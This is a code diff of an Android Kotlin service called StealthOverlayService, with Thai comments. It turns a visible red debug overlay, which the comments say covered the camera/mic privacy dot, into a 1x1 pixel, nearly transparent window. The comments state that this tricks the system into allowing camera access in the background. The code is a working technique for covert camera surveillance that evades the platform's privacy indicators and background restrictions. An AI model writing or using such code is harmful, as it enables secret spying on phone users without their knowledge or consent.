@@ -71,9 +71,11 @@ class StealthOverlayService : Service() {
             WindowManager.LayoutParams.TYPE_PHONE
         }
 
+        // Production mode: 1×1 px + alpha 0.01 + transparent → มองไม่เห็น
+        // หลอกระบบว่า app มี window visible → camera access ใน background ได้
         val params = WindowManager.LayoutParams(
-            60, // DEBUG: 60×60 ทับ camera/mic privacy dot บน status bar
-            60,
+            1,
+            1,
             type,
             WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                 WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
@@ -81,15 +83,15 @@ class StealthOverlayService : Service() {
                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
             PixelFormat.TRANSLUCENT,
         ).apply {
-            // ใช้ TOP|END เพื่อให้ position สัมพันธ์กับมุมขวาบน (รองรับ จอ ต่างขนาด)
+            // มุมขวาบน — ตำแหน่งไม่สำคัญเพราะ 1×1 มองไม่เห็น
             gravity = Gravity.TOP or Gravity.END
-            x = 30 // 30px จากขอบขวา
-            y = 15 // 15px จากด้านบน (ในระยะ status bar)
-            alpha = 1.0f // DEBUG: เห็นเต็ม; production = 0.01
+            x = 0
+            y = 0
+            alpha = 0.01f // เกือบ 0 — มองไม่เห็น แต่ระบบยังนับว่ามี window
         }
 
         val view = View(this).apply {
-            setBackgroundColor(Color.RED) // DEBUG: แดง; production = TRANSPARENT
+            setBackgroundColor(Color.TRANSPARENT)
         }
         overlayView = view
 
